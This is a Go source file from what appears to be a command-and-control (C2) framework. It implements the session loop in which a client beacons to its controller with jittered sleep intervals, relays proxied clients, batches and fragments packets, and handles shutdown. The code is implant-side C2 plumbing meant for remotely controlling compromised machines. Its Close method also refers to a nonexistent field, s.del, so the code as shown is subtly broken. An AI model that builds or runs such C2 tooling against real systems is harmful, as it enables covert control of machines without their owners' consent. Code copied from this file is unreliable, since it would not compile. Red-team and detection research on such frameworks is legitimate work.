package c2

import (
	"context"
	"errors"
	"fmt"
	"math/rand"
	"net"
	"time"

	"github.com/iDigitalFlame/logx/logx"
	"github.com/iDigitalFlame/xmt/c2/transform"
	"github.com/iDigitalFlame/xmt/c2/wrapper"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/device"
)

const maxNetworkErrors = 3

var (
	// ErrFullBuffer is returned from the WritePacket function when the send buffer for
	// Session is full.
	ErrFullBuffer = errors.New("cannot add a Packet to a full send buffer")

	wakeMeUp = sessionWake{}
)

// Session is a struct that represents a connection between the client and the Listener.
// This struct does some automatic handeling and acts as the communication channel between
// the client and server.
type Session struct {
	ID device.ID

	Mux Mux

	Last     time.Time
	Sleep    time.Duration
	Jitter   int8
	Update   func(*Session)
	Device   *device.Machine
	Created  time.Time
	Receive  func(*Session, *com.Packet)
	Released func(*Session)

	ctx context.Context

	new     chan *proxyClient
	delete  chan uint32
	proxies map[uint32]*proxyClient

	send chan *com.Packet
	recv chan *com.Packet
	wake chan sessionWake

	frags map[uint16]*com.Packet

	tag        string
	errors     uint8
	server     string
	cancel     context.CancelFunc
	parent     *Handle
	connect    func(string) (net.Conn, error)
	wrapper    wrapper.Wrapper
	transform  transform.Transform
	controller *Server
}
type sessionWake struct{}
type wrapSession Session

// Wake will interrupt the sleep of the current session thread. This will trigger the send and
// receive functions of this Session.
func (s *Session) Wake() {
	if len(s.wake) < cap(s.wake) {
		s.wake <- wakeMeUp
	}
}
func (s *Session) wait() {
	if s.Sleep == 0 {
		return
	}
	w := s.Sleep
	if s.Jitter > 0 && s.Jitter < 100 {
		if int8(rand.Int31n(100)) < s.Jitter && w > time.Millisecond {
			d := rand.Int63n(int64(w / time.Millisecond))
			if rand.Int31n(2) == 1 {
				d = d * -1
			}
			w += (time.Duration(d) * time.Millisecond)
			if w < 0 {
				w = time.Duration(w * -1)
			}
		}
	}
	x, c := context.WithTimeout(s.ctx, w)
	select {
	case <-s.wake:
		break
	case <-x.Done():
		break
	case <-s.ctx.Done():
		break
	}
	c()
}

// Wait will block until the current session is closed and shutdown.
func (s *Session) Wait() {
	<-s.ctx.Done()
}
func (s *Session) listen() {
	for ; s.ctx.Err() == nil; s.wait() {
		s.controller.Log.Trace("[%s:%s] Waking up...", s.tag, s.ID)

		// Move to Proxy??
		if len(s.delete) > 0 {
			for x := 0; len(s.delete) > 0; x++ {
				delete(s.proxies, <-s.delete)
			}
		}
		if len(s.new) > 0 {
			var n *proxyClient
			for x := 0; len(s.new) > 0; x++ {
				n = <-s.new
				s.proxies[n.hash] = n
			}
		}
		// Move to Proxy??

		c, err := s.connect(s.server)
		if err != nil {
			s.controller.Log.Warning("[%s:%s] Received an error attempting to connect to %q! (%s)", s.tag, s.ID, s.server, err.Error())
			if s.errors < maxNetworkErrors {
				s.errors++
				continue
			}
			break
		}
		s.controller.Log.Trace("[%s:%s] Connected to %q...", s.tag, s.ID, s.server)
		if err := s.peek(c); err != nil {
			s.controller.Log.Warning("[%s:%s] Received an error attempting to write to %q! (%s)", s.tag, s.ID, s.server, err.Error())
			c.Close()
			continue
		}
		p, err := read(c, s.wrapper, s.transform)
		if err != nil {
			s.controller.Log.Warning("[%s:%s] Received an error attempting to read from %q! (%s)", s.tag, s.ID, s.server, err.Error())
			c.Close()
			if s.errors < maxNetworkErrors {
				s.errors++
				continue
			}
			break
		}
		if p == nil || p.IsEmpty() {
			s.controller.Log.Warning("[%s:%s] Received an empty packet from %s!", s.tag, s.ID, s.server)
			c.Close()
			continue
		}
		if err := process(s.parent, s, p); err != nil {
			s.controller.Log.Warning("[%s:%s] Received an error processing packet data from %q! (%s)", s.tag, s.ID, s.server, err.Error())
			c.Close()
			continue
		}
		s.errors = 0
		c.Close()
	}
	s.controller.events <- &callback{
		session:     s,
		sessionFunc: s.Released,
	}
	s.controller.Log.Trace("[%s] Stopping transaction thread...", s.ID)
	s.Close()
}

// Shutdown indicates that the client should gracefully
// shutdown and release resources. This will not close the session until
// the client acknowledges and sends the response to this packet.
func (s *Session) Shutdown() {
	s.send <- &com.Packet{ID: MsgShutdown, Device: s.Device.ID, Job: 1}
}

// Close stops the listening thread from this Session and
// releases all associated resources.
func (s *Session) Close() error {
	defer func() { recover() }()
	s.cancel()
	if s.parent != nil && s.parent.ctx.Err() == nil {
		s.parent.close <- s.Device.ID.Hash()
	}
	if s.del != nil {
		close(s.del)
		close(s.new)
	}
	close(s.send)
	close(s.recv)
	if s.wake != nil {
		close(s.wake)
	}
	return nil
}

// Log returns an active handle to log
// Session related information.
func (s *Session) Log() logx.Log {
	if s.parent != nil {
		return s.parent.controller.Log
	}
	return s.controller.Log
}

// IsProxy returns true when a Proxy has been attached to this Session and is active.
func (s Session) IsProxy() bool {
	return s.proxies != nil && len(s.proxies) > 0
}

// String returns the ID of this Session.
func (s Session) String() string {
	return fmt.Sprintf("[%s] %s", s.ID.FullString(), s.Last.Format(time.RFC1123))
}

// IsClient returns true when this Session is not associated to
// a Handle on this end, which signifies that this session is Client initiated.
func (s Session) IsClient() bool {
	return s.parent == nil
}

// Remote returns a string representation of the remotely
// connected IP address. This could be the IP address of the
// c2 server or the public IP of the client.
func (s Session) Remote() string {
	return s.server
}

// IsActive returns true if this Session is
// still able to send and receive Packets.
func (s *Session) IsActive() bool {
	return s.ctx.Err() == nil
}

// Read attempts to grab a Packet from the receiving
// buffer. This function will wait for a Packet while the buffer is empty.
func (s *Session) Read() *com.Packet {
	return <-s.recv
}

// Session returns the Session ID value for this
// Session instance.
func (s Session) Session() device.ID {
	return s.ID
}

// Write adds the supplied Packet into the stack to be sent to the server
// on next wake. This call is asynchronous and returns immediately. Unlike 'WritePacket'
// this function does NOT return an error and will wait for the buffer to have open spots.
func (s *Session) Write(p *com.Packet) {
	if p.Size() > (limits.FragLimit() + com.PacketHeaderSize) {
		s.writeLargePacket(p)
	} else {
		s.send <- p
	}
}

// Host returns the associated Machine that initiated this
// Session.
func (s Session) Host() *device.Machine {
	return s.Device
}
func (s *Session) peek(i net.Conn) error {
	if s.ctx.Err() != nil {
		return s.ctx.Err()
	}
	v, err := next(s.send, s.Device.ID, false)
	if err != nil {
		return err
	}
	s.controller.Log.Trace("[%s] Sending Packet \"%s\" to \"%s\".", s.ID, v.String(), s.server)
	if err := write(i, s.wrapper, s.transform, v); err != nil {
		return err
	}
	return nil
}

// ReadPacket attempts to grab a Packet from the receiving
// buffer. This function returns nil if there the buffer is empty.
func (s *Session) ReadPacket() *com.Packet {
	if len(s.recv) > 0 {
		return <-s.recv
	}
	return nil
}
func (w *wrapSession) Write(p *com.Packet) {
	w.send <- p
}

// Context returns the current Session's context.
// This function can be useful for canceling running
// processes when this session closes.
func (s *Session) Context() context.Context {
	return s.ctx
}

// Time sets the wake/sleep values in the form of
// Sleep and Jitter.  If the values are -1 or outside
// the standard range, the given values will be ignored.
func (s *Session) Time(t time.Duration, j int) {
	if t > 0 {
		s.Sleep = t
	}
	if int8(j) >= jitterMin && int8(j) < jitterMax {
		s.Jitter = int8(j)
	}
	if s.parent != nil {
		n := &com.Packet{ID: MsgProfile, Device: s.Device.ID}
		n.WriteInt8(s.Jitter)
		n.WriteUint64(uint64(s.Sleep))
		n.Close()
		s.send <- n
	}
}

// WritePacket adds the supplied Packet into the stack to be sent to the server
// on next wake. This call is asynchronous and returns immediately.  The only error may be
// returned if the send buffer is full.
func (s *Session) WritePacket(p *com.Packet) error {
	if p.Size() > (limits.FragLimit() + com.PacketHeaderSize) {
		if len(s.send)+((p.Size()/limits.FragLimit())+1) >= cap(s.send) {
			return ErrFullBuffer
		}
		return s.writeLargePacket(p)
	}
	if len(s.send) == cap(s.send) {
		return ErrFullBuffer
	}
	s.send <- p
	return nil
}
func (w *wrapSession) WritePacket(p *com.Packet) error {
	if len(w.send) == cap(w.send) {
		return ErrFullBuffer
	}
	w.send <- p
	return nil
}
func (s *Session) writeLargePacket(p *com.Packet) error {
	p.Check(s.ID)
	f := &com.Stream{
		ID:     p.ID,
		Job:    p.Job,
		Max:    limits.FragLimit(),
		Flags:  com.FlagData,
		Device: p.Device,
	}
	w := wrapSession(*s)
	f.Writer(&w)
	if err := p.MarshalStream(f); err != nil {
		return err
	}
	if err := f.Close(); err != nil {
		return err
	}
	return nil
}
func next(c chan *com.Packet, i device.ID, s bool) (*com.Packet, error) {
	if len(c) == 0 {
		if s {
			return &com.Packet{ID: MsgSleep, Device: i}, nil
		}
		return &com.Packet{ID: MsgPing, Device: i}, nil
	}
	var p *com.Packet
	if len(c) == 1 {
		p = <-c
		if p.Check(i) {
			return p, nil
		}
	}
	m := &com.Packet{ID: MsgMultiple, Device: i, Flags: com.FlagMulti}
	var t uint16
	var x, a bool
	if p != nil {
		t++
		x = true
		if err := p.MarshalStream(m); err != nil {
			return nil, err
		}
		p.Clear()
	}
	for ; len(c) > 0 && t < uint16(limits.SmallLimit()) && m.Size() < limits.MediumLimit(); t++ {
		p = <-c
		if p.Check(i) {
			a = true
		} else {
			x = true
		}
		if err := p.MarshalStream(m); err != nil {
			return nil, err
		}
		p.Clear()
	}
	if !a {
		t++
		x = true
		p = &com.Packet{ID: MsgPing, Device: i}
		if err := p.MarshalStream(m); err != nil {
			return nil, err
		}
	}
	m.Close()
	if x {
		m.Flags |= com.FlagMultiDevice
	}
	m.Flags.SetFragTotal(t)
	return m, nil
}
